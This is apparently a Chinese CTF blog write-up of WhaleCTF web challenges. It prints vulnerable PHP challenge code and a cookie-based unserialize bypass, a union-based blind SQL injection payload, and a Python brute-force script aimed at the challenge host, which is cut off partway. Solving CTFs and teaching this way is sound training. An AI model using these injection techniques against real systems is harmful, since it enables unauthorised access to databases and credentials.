@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="0verWatch" />
+
+
+
+<meta name="description" content="把剩下的几个web题目完成记录一下">
+<meta name="keywords" content="CTF,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WhaleCTF第二期打卡的web题">
+<meta property="og:url" content="0verwatch.top/whalectf-web2.html">
+<meta property="og:site_name" content="0verWatch&#39;s Blog">
+<meta property="og:description" content="把剩下的几个web题目完成记录一下">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGouvj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGoQrn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGo3V0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGoYPU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGoN24.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGoUxJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kG1ZE4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kG8Vh9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGGkKP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGGZVS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGGM2n.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGGLGj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGJLTO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYVhQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGY3AU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYIUS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYo4g.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYH3j.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYbgs.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYqvn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYOuq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYjbV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGYxET.png">
+<meta property="og:image" content="c:/Users/Vinson%20Chan/AppData/Roaming/Typora/typora-user-images/1549181047549.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGtS5F.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGsYXF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGsU0J.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGIs3Q.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGIRH0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGIfEV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGIhNT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGIXE6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGIzCD.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGo9vd.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGoiDI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGowrR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGofsA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGohqI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGo5Zt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGoIdP.png">
+<meta property="og:image" content="c:/Users/Vinson%20Chan/AppData/Roaming/Typora/typora-user-images/1549204940505.png">
+<meta property="og:image" content="file:///C:/Users/VINSON~1/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kG54ld.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kG5jpQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/02/03/kGIEp4.png">
+<meta property="og:updated_time" content="2019-02-08T08:38:52.090Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WhaleCTF第二期打卡的web题">
+<meta name="twitter:description" content="把剩下的几个web题目完成记录一下">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/02/03/kGouvj.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="0verWatch&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/crystal.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>WhaleCTF第二期打卡的web题 | 0verWatch&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?e9bf2f4b24d981680e6d59ced18982b0";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">0verWatch</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">归档</a></li>
+                        
+                            <li><a href="/tags/">分类&amp;标签</a></li>
+                        
+                            <li><a href="/friends/">友链</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CRC32爆破/">CRC32爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Git/">Git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux安全/">Linux安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux常用命令/">Linux常用命令</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql安全配置/">Mysql安全配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Social/">Social</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Yii/">Yii</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithm/">algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二分查找/">二分查找</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反序列化/">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/微机实验/">微机实验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/服务器运维/">服务器运维</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/汇编/">汇编</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流量分析/">流量分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境部署/">环境部署</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程语言/">编程语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网站渗透/">网站渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机网路/">计算机网路</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://202.119.201.199/">CumtCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.nuptzj.cn">NuptCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.jarvisoj.com">Jarvis OJ</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.codemonster.cn/home">MOCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ctf.bugku.com/">BugkuCTF</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.shiyanbar.com/ctf/practice">实验吧</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://xz.aliyun.com/">先知社区</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://shentoushi.top/">渗透师导航</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://skysec.top/">一叶飘零</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://www.yytpublic.cn">LaurenceYu</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://chun.ringfall.me">ringfall</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">0verWatch</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">0verWatch</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">学习本无底，前进莫彷徨</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">归档</a></li>
+                
+                    <li><a href="/tags/">分类&amp;标签</a></li>
+                
+                    <li><a href="/friends/">友链</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Coding" target="_blank" href="https://coding.net/u/Ov3rWatch" title="Coding"></a>
+                            
+                                <a class="fa SegmentFault" target="_blank" href="https://segmentfault.com/" title="SegmentFault"></a>
+                            
+                                <a class="fa CSDN" target="_blank" href="https://blog.csdn.net/u011377996" title="CSDN"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-whalectf-web2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/whalectf-web2.html" class="article-date">
+      <time datetime="2018-05-06T06:59:48.000Z" itemprop="datePublished">2018-05-06</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      WhaleCTF第二期打卡的web题
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+<p>把剩下的几个web题目完成记录一下<a id="more"></a>吧。</p>
+<h3 id="登录无效"><a href="#登录无效" class="headerlink" title="登录无效"></a>登录无效</h3><p>这一题好像是bugku的原题，就是一个反序列化的题目，查看源码发现有提示，对应输入一个hint参数，发现源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">include_once(&quot;flag.php&quot;); </span><br><span class="line"></span><br><span class="line">$cookie = $_COOKIE[&apos;Whale&apos;]; </span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;hint&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;) </span><br><span class="line">&#123;    </span><br><span class="line">    echo &quot;$flag&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line"></span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line"></span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; </span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;!--hint:paramenter:hint--&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line"></span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">&#125; </span><br><span class="line">$KEY=&apos;Whale:www.whalectf.com&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里面在意的就是存在unserialize函数，也就是反序列化，简单说一下代码的流程，反序列化cookie值，只要使得cookie值等于key的值就可以了，但是这里的key得注意一下，这里的key值一开始是等于NULL的，他是到后面才给KEY赋值的，而且这题难度大大降低了，不是以类的方式来实现反序列化的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+<p>设置cookie，直接得到flag</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGouvj.png" alt="kGouvj.png"></p>
+<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>查看源码查看头发现没什么可以利用了的于是就查找一下是否源码泄露，用dirsearch搜一波，发现里面有几个页面是存在的，前面两个是一样的页面，有用的页面是最后一个</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGoQrn.png" alt="kGoQrn.png"></p>
+<p>在index.php~里面发现对应配置文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $dbhost = <span class="string">"localhost"</span>;</span><br><span class="line">   $dbuser = <span class="string">"root"</span>;</span><br><span class="line">   $dbpass = <span class="string">"123456"</span>;</span><br><span class="line">   $db = <span class="string">"ctf"</span>;</span><br><span class="line">   $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">   mysqli_set_charset($conn,<span class="string">"utf8"</span>);</span><br><span class="line">  </span><br><span class="line">   <span class="comment">/* sql</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">      create  table `admin` (</span></span><br><span class="line"><span class="comment">         `id` int(10) not null primary key auto_increment,</span></span><br><span class="line"><span class="comment">         `username` varchar(20) not null ,</span></span><br><span class="line"><span class="comment">         `password` varchar(32) not null</span></span><br><span class="line"><span class="comment">      );</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span>   <span class="title">filter</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">       $filterlist = <span class="string">"/\(|\)|username|password|where|</span></span><br><span class="line"><span class="string">       case|when|like|regexp|into|limit|=|for|;/"</span>;</span><br><span class="line">       <span class="keyword">if</span>(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">"illegal input!"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $str;</span><br><span class="line">   &#125;</span><br><span class="line"> $username = <span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])?</span><br><span class="line"> filter($_POST[<span class="string">'username'</span>]):<span class="keyword">die</span>(<span class="string">"please input username!"</span>);</span><br><span class="line"> $password = <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])?</span><br><span class="line"> filter($_POST[<span class="string">'password'</span>]):<span class="keyword">die</span>(<span class="string">"please input password!"</span>);</span><br><span class="line"> $sql = <span class="string">"select * from admin where  username =</span></span><br><span class="line"><span class="string">  '$username' and password = '$password' "</span>;</span><br><span class="line">  </span><br><span class="line"> $res = $conn -&gt; query($sql);</span><br><span class="line"> <span class="keyword">if</span>($res-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">   $row = $res -&gt; fetch_assoc();</span><br><span class="line">   <span class="keyword">if</span>($row[<span class="string">'id'</span>])&#123;</span><br><span class="line">      <span class="keyword">echo</span> $row[<span class="string">'username'</span>];</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"The content in the password column is the flag!"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">  </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从上面的代码可以得到的信息有数据库里面的字段数有三个，还有他的过滤字段，我们看一下他的执行流程，分别用POST参数获取username和password参数，然后经过过滤，从数据库中获取一组数据，有数据就显示用户名，最后一句可以看见flag就是password</p>
+<p>这个过滤有两个点需要注意一下</p>
+<p>没有了括号就不能用sql里面的语句了,没有了password，但是他却是字段名，所以SQL语句里面并不能出现password这个列名</p>
+<p>这里用到一个union盲注的知识点</p>
+<p>因为这里MySQL的字符串排序是从头开始一个个ASCII码去比较的，因此会有下面的结果</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGo3V0.png" alt="kGo3V0.png"></p>
+<p> order by 3是以第三列作为排序，然后distinct去掉重复的名字，desc是降序排序，默认是升序，也就是小的在下面大的在上面，可以利用盲注去爆破出密码，这里我是从ASCII码增大的情况考虑也就是(48,127)比他大了就减一就对应的ASCII码,也就是说零界点是减一的时候</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGoYPU.png" alt="kGoYPU.png"></p>
+<p>当然我们可以升序去爆破,就把符号字典倒序过来即可，零界点刚好是不出现用户名的时候，这里的盲注是一开始就知道用户名的，我们需要获取对应的用户名，怎么获取，可以利用一个异或去获取对应的用户名，当然这里除了^0,还可以是^1^1，会将数据库所有结果都会返回的。</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGoN24.png" alt="kGoN24.png"></p>
+<p>发包可以获取得到对应的用户名</p>
+<p><img src="https://s2.ax1x.com/2019/02/03/kGoUxJ.png" alt="kGoUxJ.png"></p>
+<p>下面就是执行爆破的脚本，就是利用python字符串的format来实现，我这里使用的是升序爆破，所以我在构造字典的时候使用了一个字符串切片逆序字符串，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeStr</span><span class="params">(begin,end)</span>:</span></span><br><span class="line">	ss = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(begin,end):</span><br><span class="line">		ss = ss+ chr(i)</span><br><span class="line">	<span class="keyword">return</span> ss[<span class="number">-1</span>::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetPassword</span><span class="params">()</span>:</span></span><br><span class="line">	url = <span class="string">'http://ctf.whaledu.com:10801/47g256f48gff/index.php'</span></span><br><span class="line">	payload = <span class="string">"whaleadmin' union distinct select 1,2,0x&#123;hex&#125; order by 3#"</span></span><br><span class="line">	flag = <span class="string">""</span></span><br><span class="line">	testStr = makeStr(<span class="number">42</span>,<span class="number">127</span>)</span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> testStr:</span><br><span class="line">			data = &#123;<span class="string">'username'</span>:payload.format(hex=(flag+i).encode(<span class="string">'hex'</span>)),<span class="string">'password'</span>:<span class="string">'1'</span>&#125;</span><br><span class="line">			res = requests.post(url=url,data = data)</span><br><span class="line">			<span class="comment">#print res.content</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">'whaleadmin'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.content:</span><br><span class="line">				flag = flag + chr(ord(i))</span><br><span class="line">				<span class="keyword">print</span> flag</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"[+]Attacked by 0verWatch"</span>,i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="comment">#print makeStr(42,127)</span></span><br><span class="line">	